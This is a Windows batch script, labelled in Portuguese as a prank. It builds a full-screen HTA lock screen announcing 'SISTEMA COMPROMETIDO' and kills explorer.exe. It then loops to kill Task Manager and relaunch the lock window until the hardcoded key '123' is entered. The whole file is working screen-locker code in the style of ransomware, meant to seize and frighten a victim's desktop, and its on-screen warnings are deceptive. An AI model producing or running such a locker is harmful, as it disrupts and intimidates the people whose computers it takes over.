@echo off
title SISTEMA INVADIDO - TROLAGEM
color 0c

:: --- CONFIGURAÇÃO ---
set "CHAVE=123"
set "TEMP_HTA=%temp%\trolagem_hacker.hta"
set "TEMP_SIGNAL=%temp%\desbloqueado_hacker.txt"

:: --- LIMPEZA INICIAL ---
if exist "%TEMP_SIGNAL%" del "%TEMP_SIGNAL%"

:: --- CRIAÇÃO DO HTA DINAMICAMENTE ---
(
echo ^<html^>^<head^>^<title^>SISTEMA BLOQUEADO^</title^>
echo ^<hta:application id="oHTA" border="none" caption="no" contextmenu="no" innerquitbutton="no" maximizebutton="no" minimizebutton="no" navigable="no" scroll="no" selection="no" showintaskbar="no" singleinstance="yes" sysmenu="no" windowstate="maximize" /^>
echo ^<style^>
echo   body { background-color: black; color: #00FF00; font-family: 'Courier New', Courier, monospace; text-align: center; overflow: hidden; margin: 0; padding: 20px; }
echo   .container { border: 2px solid #00FF00; padding: 20px; height: 90vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
echo   img.hacker { width: 300px; border: 2px solid #00FF00; margin-bottom: 20px; }
echo   img.qr { width: 150px; background: white; padding: 5px; margin: 20px; }
echo   h1 { color: #FF0000; font-size: 3em; margin: 0; text-shadow: 2px 2px #550000; }
echo   p { font-size: 1.2em; max-width: 800px; }
echo   .aviso { color: #FFFF00; font-weight: bold; font-size: 1.5em; text-transform: uppercase; border: 1px dashed #FFFF00; padding: 10px; margin: 10px; }
echo   input { background: #111; color: #00FF00; border: 1px solid #00FF00; padding: 10px; font-size: 1.5em; text-align: center; width: 200px; margin-top: 20px; }
echo   button { background: #00FF00; color: black; border: none; padding: 10px 20px; font-size: 1.2em; font-weight: bold; cursor: pointer; margin-top: 10px; }
echo   button:hover { background: #00CC00; }
echo ^</style^>
echo ^<script language="VBScript"^>
echo   Sub Window_OnLoad
echo     window.resizeTo screen.width, screen.height
echo     window.moveTo 0, 0
echo   End Sub
echo   Sub VerificarChave
echo     If txtChave.Value = "%CHAVE%" Then
echo       Set fso = CreateObject("Scripting.FileSystemObject")
echo       Set f = fso.CreateTextFile("%TEMP_SIGNAL:\=\\%", True)
echo       f.WriteLine "OK"
echo       f.Close
echo       MsgBox "SISTEMA RESTAURADO COM SUCESSO!", vbInformation, "DESBLOQUEADO"
echo       window.close
echo     Else
echo       MsgBox "CHAVE INCORRETA! O SISTEMA CONTINUARA BLOQUEADO.", vbCritical, "ERRO DE ACESSO"
echo       txtChave.Value = ""
echo     End If
echo   End Sub
echo ^</script^>
echo ^</head^>^<body^>
echo ^<div class="container"^>
echo   ^<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABAAAAAYACAYAAADogjqqAAERPGNhQlgAARE8anVtYgAAAB5qdW1kYzJwYQARABCAAACqADibcQNjMnBhAAAANzhqdW1iAAAAR2p1bWRjMm1hABEAEIAAAKoAOJtxA3VybjpjMnBhOmFjZGRiNWQ2LWJiZWYtNDA5MC05MWZhLTJhMmQxNmY1OTIwOAAAAAHwanVtYgAAAClqdW1kYzJhcwARABCAAACqADibcQNjMnBhLmFzc2VydGlvbnMAAAAA/Gp1bWIAAABBanVtZGNib3IAEQAQgAAAqgA4m3ETYzJwYS5hY3Rpb25zLnYyAAAAABhjMnNoGELugazMgnyC9nmWHXtQOQAAALNjYm9yoWdhY3Rpb25zgqNmYWN0aW9ubGMycGEuY3JlYXRlZG1zb2Z0d2FyZUFnZW50oWRuYW1lZkdQVC00b3FkaWdpdGFsU291cmNlVHlwZXhGaHR0cDovL2N2LmlwdGMub3JnL25ld3Njb2Rlcy9kaWdpdGFsc291cmNldHlwZS90cmFpbmVkQWxnb3JpdGhtaWNNZWRpYaFmYWN0aW9ubmMycGEuY29udmVydGVkAAAAw2p1bWIAAABAanVtZGNib3IAEQAQgAAAqgA4m3ETYzJwYS5oYXNoLmRhdGEAAAAAGGMyc2ihamB/TGYkVSiEBC8lLqaMAAAAe2Nib3KlamV4Y2x1c2lvbnOBomVzdGFydBghZmxlbmd0aBk3amRuYW1lbmp1bWJmIG1hbmlmZXN0Y2FsZ2ZzaGEyNTZkaGFzaFgglhzZsUcXKDuZcJpNLvixZvVIDVzeg7ChCAxtyBzZ809jcGFkSAAAAAAAAAAAAAACAmp1bWIAAAAnanVtZGMyY2wAEQAQgAAAqgA4m3EDYzJwYS5jbGFpbS52MgAAAAHTY2JvcqdqaW5zdGFuY2VJRHgseG1wOmlpZDoyODRkZGMwNC0wZmQ0LTRkNjktYWM4YS1lMGY1ODhjOGNkMzR0Y2xhaW1fZ2VuZXJhdG9yX2luZm+iZG5hbWVnQ2hhdEdQVHdvcmcuY29udGVudGF1dGguYzJwYV9yc2YwLjc4LjVpc2lnbmF0dXJleE1zZWxmI2p1bWJmPS9jMnBhL3VybjpjMnBhOmFjZGRiNWQ2LWJiZWYtNDA5MC05MWZhLTJhMmQxNmY1OTIwOC9jMnBhLnNpZ25hdHVyZXJjcmVhdGVkX2Fzc2VydGlvbnOBomN1cmx4KXNlbGYjanVtYmY9YzJwYS5hc3NlcnRpb25zL2MycGEuaGFzaC5kYXRhZGhhc2hYIPMlkLqhKdq0M6WNZTwGr7yI8SEaqXv3nkQzT0UZD0tPc2dhdGhlcmVkX2Fzc2VydGlvbnOBomN1cmx4KnNlbGYjanVtYmY9YzJwYS5hc3NlcnRpb25zL2MycGEuYWN0aW9ucy52MmRoYXNoWCCAxxLizhCzqZT81fCjCnjRsFwr8n6QC3E1Ri11XXTd1GhkYzp0aXRsZWlpbWFnZS5wbmdjYWxnZnNoYTI1NgAAMvdqdW1iAAAAKGp1bWRjMmNzABEAEIAAAKoAOJtxA2MycGEuc2lnbmF0dXJlAAAAMsdjYm9y0oRZB7uiASYYIYJZAzEwggMtMIICFaADAgECAhRsKaNz+9zB1rtI/DS6XvpABODERjANBgkqhkiG9w0BAQwFADBKMRowGAYDVQQDDBFXZWJDbGFpbVNpZ25pbmdDQTENMAsGA1UECwwETGVuczEQMA4GA1UECgwHVHJ1ZXBpYzELMAkGA1UEBhMCVVMwHhcNMjUwNDE1MTUwOTA1WhcNMjYwNDE1MTUwOTA0WjBQMQswCQYDVQQGEwJVUzEPMA0GA1UECgwGT3BlbkFJMQ0wCwYDVQQLDARTb3JhMSEwHwYDVQQDDBhUcnVlcGljIExlbnMgQ0xJIGluIFNvcmEwWTATBgcqhkjOPQIBBggqhkjOPQMB" class="hacker" /^>
echo   ^<h1^>SISTEMA COMPROMETIDO^</h1^>
echo   ^<p^>Ola, irmao. Seu computador foi bloqueado porque voce nao para de mexer onde nao deve!^</p^>
echo   ^<div class="aviso"^>AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.^<br^>^<b^>O GERENCIADOR DE TAREFAS FOI DESATIVADO.^</b^>^</div^>
echo   ^<p^>Para desbloquear, voce deve escanear o codigo abaixo ou digitar a chave secreta:^</p^>
echo   ^<img src="data:image/png;base64,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" class="qr" /^>
echo   ^<br /^>^<input type="password" id="txtChave" placeholder="Digite a Chave" /^>
echo   ^<br /^>^<button onclick="VerificarChave"^>DESBLOQUEAR^</button^>
echo ^</div^>
echo ^</body^>^</html^>
) > "%TEMP_HTA%"

:: --- BLOQUEIO INICIAL ---
taskkill /f /im explorer.exe >nul 2>&1
start "" mshta.exe "%TEMP_HTA%"

:: --- LOOP DE PROTEÇÃO ---
:loop
taskkill /f /im taskmgr.exe >nul 2>&1
tasklist /fi "IMAGENAME eq explorer.exe" | find /i "explorer.exe" >nul
if not errorlevel 1 taskkill /f /im explorer.exe >nul 2>&1

if exist "%TEMP_SIGNAL%" (
    del "%TEMP_SIGNAL%"
    del "%TEMP_HTA%"
    start explorer.exe
    exit
)

:: Se o HTA for fechado, reabre
tasklist /fi "IMAGENAME eq mshta.exe" | find /i "mshta.exe" >nul
if errorlevel 1 start "" mshta.exe "%TEMP_HTA%"

timeout /t 1 /nobreak >nul
goto loop
